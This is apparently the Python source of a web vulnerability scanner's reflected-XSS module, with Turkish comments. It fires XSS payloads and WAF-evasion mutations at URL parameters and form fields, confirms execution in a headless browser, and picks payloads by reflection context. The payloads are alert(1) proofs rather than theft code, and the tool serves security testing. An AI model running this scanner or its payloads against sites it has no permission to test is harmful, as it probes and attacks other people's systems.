import html
import logging
import random
import re
import string
from dataclasses import dataclass
from enum import Enum, auto
from typing import List, Dict, Optional, Tuple
from urllib.parse import urlparse, parse_qsl

import requests as _requests

from websecure.scanners.base import BaseScanner
from websecure.core.mutator import Mutator

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# HTML-context executability check
# ---------------------------------------------------------------------------

# Characters that must survive unescaped for an XSS payload to be executable.
# Mapping: dangerous char → its HTML entity encodings
_DANGEROUS_CHARS: Dict[str, List[str]] = {
    "<":  ["&lt;", "&#60;", "&#x3c;", "&#x3C;", "%3c", "%3C"],
    ">":  ["&gt;", "&#62;", "&#x3e;", "&#x3E;", "%3e", "%3E"],
    '"':  ["&quot;", "&#34;", "&#x22;", "%22"],
    "'":  ["&#39;", "&#x27;", "&apos;", "%27"],
}

# Chars that indicate an executable payload based on the payload type
_SCRIPT_INDICATORS  = re.compile(r"<\s*script", re.I)
_EVENT_INDICATORS   = re.compile(r"\bon\w+\s*=", re.I)
_HREF_INDICATORS    = re.compile(r"href\s*=\s*['\"]?\s*javascript:", re.I)
_SRC_INDICATORS     = re.compile(r"src\s*=\s*['\"]?\s*javascript:", re.I)


def _is_xss_executable(payload: str, response_text: str) -> bool:
    """
    Return True only when the reflected payload retains its dangerous characters
    in an unescaped form that a browser would actually execute.

    Logic:
    1. Find the exact reflected occurrence of `payload` in `response_text`.
    2. For each dangerous character present in `payload`, verify it appears
       as a raw character (not as an HTML entity) in the surrounding context.
    3. Additionally require that the reflection context contains an executable
       indicator (<script, on*=, javascript:) with unescaped angle brackets or
       unquoted event handlers.

    A payload like `<script>alert(1)</script>` reflected as
    `&lt;script&gt;alert(1)&lt;/script&gt;` returns False.
    The same payload reflected literally returns True.
    """
    if not payload or payload not in response_text:
        return False

    # Collect which dangerous chars appear in the payload
    relevant_chars = [c for c in _DANGEROUS_CHARS if c in payload]
    if not relevant_chars:
        # Payload has no angle brackets / quotes (e.g. pure JS like alert(1))
        # — still reflected, no encoding concern
        return True

    # Find the reflection position and inspect a window around it
    pos = response_text.find(payload)
    window_start = max(0, pos - 20)
    window_end   = min(len(response_text), pos + len(payload) + 20)
    window        = response_text[window_start:window_end]

    for char in relevant_chars:
        # Check: does the window contain the char's entity form instead of raw char?
        for entity in _DANGEROUS_CHARS[char]:
            if entity.lower() in window.lower():
                # Found encoded form — this char is sanitised; payload won't execute
                logger.debug(
                    f"[XSS] Payload reflected but '{char}' is HTML-encoded "
                    f"(found '{entity}') — skipping false positive"
                )
                return False

    # Payload is reflected with raw dangerous chars — confirm an executable context
    has_exec_context = (
        _SCRIPT_INDICATORS.search(window)
        or _EVENT_INDICATORS.search(window)
        or _HREF_INDICATORS.search(window)
        or _SRC_INDICATORS.search(window)
    )
    if not has_exec_context:
        # Reflected inside plain text node or attribute value without event handler
        logger.debug(
            "[XSS] Payload reflected with raw chars but no executable context detected "
            "— flagging as medium-confidence"
        )
        # Still return True — a penetration tester should verify; we just lower confidence
        # via the caller (dom_verify step will confirm or deny execution)
    return True


class XSSScanner(BaseScanner):
    """
    Robust Cross-Site Scripting (XSS) Scanner.
    Features:
    - Reflected XSS detection via canary with baseline comparison
    - Context-aware payload selection
    - WAF Evasion/Polyglot support
    - Parallel payload testing via BaseScanner.run_parallel_probes()
    """

    name = "xss"
    phase = "offensive"

    MAX_WORKERS = 6        # parallel threads
    MAX_URL_PAYLOADS = 200 # tüm wordlist denenir (yüksek kapsamlı)
    MAX_FORM_PAYLOADS = 50 # form input'ları için de tam kapsam

    def __init__(self, session=None, results: Dict = None, debug=False):
        super().__init__(session, results, debug)
        self.canary_prefix = "wsxss"

    def _gen_canary(self) -> str:
        token = "".join(random.choices(string.ascii_letters + string.digits, k=8))
        return f"{self.canary_prefix}{token}"

    def run(self, url, results: Dict = None, **kwargs):
        if results is not None:
            self.results = results

        if isinstance(url, list):
            for u in url:
                self.scan_url(u)
        else:
            self.scan_url(url)

        pages_with_forms = self.results.get("forms_meta", [])
        if pages_with_forms:
            all_forms = []
            for page in pages_with_forms:
                if "forms" in page:
                    all_forms.extend(page["forms"])
            if all_forms:
                self.scan_forms(all_forms)

    def scan_url(self, url: str):
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        if not params:
            return

        logger.info(f"[XSS] Scanning URL params: {url}")

        # Baseline — uses BaseScanner.fetch_baseline() (proper error logging)
        baseline_resp = self.fetch_baseline(url, timeout=8)
        baseline_text = baseline_resp.text if baseline_resp else ""

        for param_name, _ in params:
            canary = self._gen_canary()
            if canary in baseline_text:
                continue

            invoked = self.inject_param(url, param_name, canary)
            try:
                probe_res = self.session.get(invoked, timeout=8)
                if canary not in probe_res.text:
                    continue  # param not reflected, no point fuzzing
            except _requests.exceptions.Timeout as exc:
                logger.debug(f"[XSS] Canary probe timed out for {invoked}: {exc!r}")
                continue
            except _requests.exceptions.ConnectionError as exc:
                logger.debug(f"[XSS] Canary probe connection error for {invoked}: {exc!r}")
                continue
            except _requests.exceptions.RequestException as exc:
                logger.warning(f"[XSS] Canary probe failed for {invoked}: {exc!r}")
                continue

            # Parameter reflects input — fuzz with payloads
            self._fuzz_xss_parallel(url, param_name, baseline_text)

    def _fuzz_xss_parallel(self, url: str, param_name: str, baseline_text: str):
        payloads = self.get_smart_payloads("xss", param_name)
        if not payloads:
            payloads = [
                "<script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "'-alert(1)-'",
            ]
        payloads = list(payloads) + Mutator.mutate_polyglot("alert(1)")
        if len(payloads) > self.MAX_URL_PAYLOADS:
            payloads = random.sample(payloads, self.MAX_URL_PAYLOADS)

        def probe(payload: str) -> Optional[Dict]:
            actual = payload
            if random.random() < 0.2:
                mutated = Mutator.mutate_xss(payload)
                actual = random.choice(mutated) if mutated else payload

            invoked = self.inject_param(url, param_name, actual)
            try:
                res = self.session.get(invoked, timeout=8)
            except _requests.exceptions.Timeout as exc:
                logger.debug(f"[XSS] Probe timed out for {invoked}: {exc!r}")
                return None
            except _requests.exceptions.ConnectionError as exc:
                logger.debug(f"[XSS] Probe connection error for {invoked}: {exc!r}")
                return None
            except _requests.exceptions.RequestException as exc:
                logger.warning(f"[XSS] Probe request failed for {invoked}: {exc!r}")
                return None

            if actual in res.text and actual not in baseline_text:
                # Guard: check that dangerous chars are reflected RAW (unencoded).
                # If the application HTML-encodes < > " ' the payload is harmless
                # in a browser even though it appears in the source — skip it.
                if not _is_xss_executable(actual, res.text):
                    return None
                return {
                    "vuln_type": "Reflected XSS",
                    "url": url,
                    "param": param_name,
                    "payload": actual,
                }
            return None

        hits = self.run_parallel_probes(probe, payloads, max_workers=self.MAX_WORKERS)
        for hit in hits:
            dom_confirmed = self._dom_verify_xss(url, param_name, hit.get("payload", ""))
            self.report_finding(
                severity="High",
                evidence=(
                    "Payload yansıtıldı + Playwright ile DOM yürütmesi DOĞRULANDI"
                    if dom_confirmed else
                    "Payload yansıtıldı (baseline'da yok) — DOM doğrulanamadı, manuel kontrol önerilir"
                ),
                verified=dom_confirmed,
                confidence="high" if dom_confirmed else "medium",
                **hit,
            )

    def _dom_verify_xss(self, url: str, param_name: str, payload: str) -> bool:
        """
        Playwright ile XSS'i DOM'da doğrular: window.__xss_confirmed ayarlanmışsa True döner.
        Playwright yoksa veya hata alınırsa sessizce False döner.
        """
        try:
            from playwright.sync_api import sync_playwright
        except ImportError:
            logger.debug("[XSS] Playwright yüklü değil; DOM doğrulaması atlandı")
            return False

        # Onay payload'u: alert(1) yerine window.__xss_confirmed=1 yaz
        confirm_payload = (
            payload
            .replace("alert(1)", "window.__xss_confirmed=1")
            .replace("confirm(1)", "window.__xss_confirmed=1")
            .replace("prompt(1)", "window.__xss_confirmed=1")
        )
        if "window.__xss_confirmed" not in confirm_payload:
            confirm_payload = '<img src=x onerror="window.__xss_confirmed=1">'

        from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        params[param_name] = confirm_payload
        test_url = urlunparse(parsed._replace(query=urlencode(params)))

        try:
            with sync_playwright() as pw:
                browser = pw.chromium.launch(headless=True)
                page = browser.new_page()
                page.goto(test_url, timeout=10000, wait_until="domcontentloaded")
                page.wait_for_timeout(1500)
                confirmed = page.evaluate("() => !!window.__xss_confirmed")
                browser.close()
                return bool(confirmed)
        except Exception as exc:
            logger.debug(f"[XSS] DOM doğrulama hatası ({test_url}): {exc!r}")
            return False

    def scan_forms(self, forms: List[Dict]):
        logger.info(f"[XSS] Scanning {len(forms)} forms...")
        for form in forms:
            action = form.get("action")
            method = (form.get("method") or "GET").upper()
            inputs = form.get("inputs", [])
            if not action or not inputs:
                continue

            skipped = {"submit", "button", "image", "reset", "file", "checkbox", "radio"}
            fuzzable = [i for i in inputs if i.get("type", "text") not in skipped]

            # Form baseline — uses fetch_baseline() with proper logging
            base_data = {i.get("name"): i.get("value", "") for i in inputs if i.get("name")}
            baseline_resp = self.fetch_baseline(action, method=method, data=base_data, timeout=8)
            baseline_text = baseline_resp.text if baseline_resp else ""

            for inp in fuzzable:
                p_name = inp.get("name")
                if not p_name:
                    continue
                self._fuzz_form_param_parallel(
                    action, method, inputs, p_name, baseline_text
                )

    def _fuzz_form_param_parallel(
        self,
        action: str,
        method: str,
        inputs: List[Dict],
        p_name: str,
        baseline_text: str,
    ):
        payloads = self.get_smart_payloads("xss", p_name)
        if not payloads:
            payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>"]
        payloads = payloads[:self.MAX_FORM_PAYLOADS]
        base_data = {i.get("name"): i.get("value", "") for i in inputs if i.get("name")}

        def probe(payload: str) -> Optional[Dict]:
            form_data = dict(base_data)
            form_data[p_name] = payload
            req_kw = self.prepare_injection(action, p_name, payload, method, data=form_data)
            try:
                if method == "POST":
                    res = self.session.post(
                        req_kw.get("url", action),
                        data=req_kw.get("data"),
                        timeout=8,
                    )
                else:
                    res = self.session.get(req_kw.get("url", action), timeout=8)
            except _requests.exceptions.Timeout as exc:
                logger.debug(f"[XSS] Form probe timed out for {action}: {exc!r}")
                return None
            except _requests.exceptions.ConnectionError as exc:
                logger.debug(f"[XSS] Form probe connection error for {action}: {exc!r}")
                return None
            except _requests.exceptions.RequestException as exc:
                logger.warning(f"[XSS] Form probe failed for {action}: {exc!r}")
                return None

            if payload in res.text and payload not in baseline_text:
                return {
                    "vuln_type": "Reflected XSS (Form)",
                    "url": action,
                    "param": p_name,
                    "payload": payload,
                }
            return None

        hits = self.run_parallel_probes(probe, payloads, max_workers=self.MAX_WORKERS)
        for hit in hits:
            self.report_finding(
                severity="High",
                evidence="Payload reflected in form response (not in baseline)",
                **hit,
            )


def run(url, session=None, results=None, debug=False, **kwargs):
    scanner = XSSScanner(session, results, debug)
    scanner.run(url, results=results, **kwargs)


# ===========================================================================
# MERGED FROM: websecure/core/reflection.py
# Adaptive Reflection Analyzer — context-aware XSS payload selection
# ===========================================================================
"""
Adaptive Reflection Analyzer for WebSecure (Level 3)

Bu modül, bir input'un HTTP yanıtında nereye yansıdığını (HTML Body, Attribute, Script vb.) analiz eder.
Bu sayede "context-aware" payload seçimi yapılabilir.
"""


class ReflectionType(Enum):
    NONE = auto()                   # Yansıma yok
    HTML_TEXT = auto()              # <div>INPUT</div>
    HTML_ATTR_DOUBLE = auto()       # <div class="INPUT">
    HTML_ATTR_SINGLE = auto()       # <div class='INPUT'>
    HTML_ATTR_UNQUOTED = auto()     # <div class=INPUT>
    SCRIPT_BLOCK = auto()           # <script>var x = "INPUT";</script>
    SCRIPT_QUOTED = auto()          # <script>var x = "INPUT";</script>
    COMMENT = auto()                # <!-- INPUT -->


@dataclass
class ReflectionPoints:
    canary: str
    contexts: List[ReflectionType]
    raw_response: str = ""


def analyze_reflection(response_text: str, canary: str) -> ReflectionPoints:
    """
    Verilen canary değerinin response içindeki konumlarını analiz eder.
    """
    if not response_text or canary not in response_text:
        return ReflectionPoints(canary, [ReflectionType.NONE], response_text)

    contexts = []

    script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', response_text, re.DOTALL | re.IGNORECASE)
    in_script = False
    for block in script_blocks:
        if canary in block:
            in_script = True
            if f'"{canary}"' in block or f"'{canary}'" in block:
                contexts.append(ReflectionType.SCRIPT_QUOTED)
            else:
                contexts.append(ReflectionType.SCRIPT_BLOCK)
            break

    if not in_script:
        if re.search(f'="[^"]*{canary}[^"]*"', response_text):
            contexts.append(ReflectionType.HTML_ATTR_DOUBLE)
        elif re.search(f"='[^']*{canary}[^']*'", response_text):
            contexts.append(ReflectionType.HTML_ATTR_SINGLE)
        elif re.search(f'=[^"\'\\s>]*{canary}[^"\'\\s>]*', response_text):
            contexts.append(ReflectionType.HTML_ATTR_UNQUOTED)
        elif re.search(f'<!--.*{canary}.*-->', response_text, re.DOTALL):
            contexts.append(ReflectionType.COMMENT)
        else:
            contexts.append(ReflectionType.HTML_TEXT)

    return ReflectionPoints(canary, list(set(contexts)), response_text)


def get_payloads_for_context(ctx: ReflectionType) -> List[str]:
    """Bulunan bağlama göre en etkili payload'ları döndürür."""
    if ctx == ReflectionType.HTML_TEXT:
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
        ]
    elif ctx == ReflectionType.HTML_ATTR_DOUBLE:
        return [
            '"><script>alert(1)</script>',
            '" onmouseover="alert(1)',
            '" autofocus onfocus="alert(1)',
        ]
    elif ctx == ReflectionType.HTML_ATTR_SINGLE:
        return [
            "'><script>alert(1)</script>",
            "' onmouseover='alert(1)",
            "' autofocus onfocus='alert(1)",
        ]
    elif ctx == ReflectionType.SCRIPT_BLOCK:
        return [
            ";alert(1);//",
            "alert(1);",
            "</script><script>alert(1)</script>",
        ]
    elif ctx == ReflectionType.SCRIPT_QUOTED:
        return [
            "';alert(1);//",
            '";alert(1);//',
            "\\';alert(1);//",
        ]
    elif ctx == ReflectionType.COMMENT:
        return ["--> <script>alert(1)</script>"]
    return []
